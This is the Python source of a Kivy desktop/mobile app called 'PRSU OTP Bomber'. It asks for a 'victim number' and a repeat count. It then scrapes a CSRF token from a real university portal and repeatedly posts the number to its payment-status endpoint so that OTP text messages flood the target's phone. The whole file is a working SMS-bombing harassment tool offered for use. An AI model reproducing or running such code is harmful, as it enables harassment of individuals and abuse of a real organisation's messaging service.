from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
import requests
from bs4 import BeautifulSoup
import time

class PRSUOTPBomberApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.icon = "bomber.png"
        # Heading
        self.heading_label = Label(text="PRSU OTP Bomber", font_size='20sp', bold=True, color=[1, 0, 0, 1])
        self.layout.add_widget(self.heading_label)

        # Your mobile number input
        self.mobile_label = Label(text="Enter the victim number:")
        self.layout.add_widget(self.mobile_label)

        self.mobile_entry = TextInput()
        self.layout.add_widget(self.mobile_entry)

        # Loop count input
        self.loop_label = Label(text="How many times do you want to send OTP:")
        self.layout.add_widget(self.loop_label)

        self.loop_entry = TextInput()
        self.layout.add_widget(self.loop_entry)

        # Delay input
        self.delay_label = Label(text="Time interval b/w each OTP send (in sec):")
        self.layout.add_widget(self.delay_label)

        self.delay_entry = TextInput()
        self.layout.add_widget(self.delay_entry)

        # Start Execution button
        self.execute_button = Button(text="Start Bombing", on_press=self.execute_requests)
        self.layout.add_widget(self.execute_button)

        # Progress Bar
        self.progress_bar = ProgressBar(max=100)
        self.layout.add_widget(self.progress_bar)

        # Loop Status
        self.loop_status_label = Label(text="")
        self.layout.add_widget(self.loop_status_label)

        # Result
        self.result_label = Label(text="")
        self.layout.add_widget(self.result_label)

        # Footer with GitHub link
        self.footer_label = Label(text="[ref=https://github.com/Rak5ha5]Created by Rakshas github.com/Rak5ha5[/ref]",
                                  markup=True, font_size='12sp', color=[0, 0, 1, 1])
        self.layout.add_widget(self.footer_label)

        return self.layout

    def execute_requests(self, instance):
        url = "https://online.prsu.ac.in/site/paymentstatuspost"
        base_url = "https://online.prsu.ac.in"
        headers = {
            # Your headers here
        }

        session = requests.Session()

        mobile_number = self.mobile_entry.text
        loop_count = int(self.loop_entry.text)
        delay_seconds = int(self.delay_entry.text)

        self.progress_bar.max = loop_count
        self.loop_status_label.text = ""

        def execute_requests_thread(dt):
            try:
                if self.progress_bar.value < loop_count:
                    response = session.get(base_url, headers=headers)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    csrf_token_meta = soup.find('meta', {'name': 'csrf-token'})

                    if csrf_token_meta:
                        csrf_token = csrf_token_meta.get('content', 'CSRF Token Not Found')
                    else:
                        csrf_token = 'CSRF Token Not Found'

                    data = {
                        "mobile": mobile_number
                    }

                    headers["x-csrf-token"] = csrf_token

                    response = session.post(url, headers=headers, data=data)

                    self.progress_bar.value += 1
                    percentage = int((self.progress_bar.value / loop_count) * 100)
                    self.loop_status_label.text = f"Loop {self.progress_bar.value}/{loop_count} " \
                                                  f"({percentage}% complete, OTPs sent: {self.progress_bar.value})"

                    time.sleep(delay_seconds)
                else:
                    self.result_label.text = f"{loop_count}/{loop_count} loops are done"
                    Clock.unschedule(execute_requests_thread)  # Stop the scheduled function
            except Exception as e:
                print(f"Error: {e}")
                print("Check if there is an issue with internet connectivity or server response.")

        Clock.schedule_interval(execute_requests_thread, delay_seconds)

if __name__ == '__main__':
    PRSUOTPBomberApp().run()
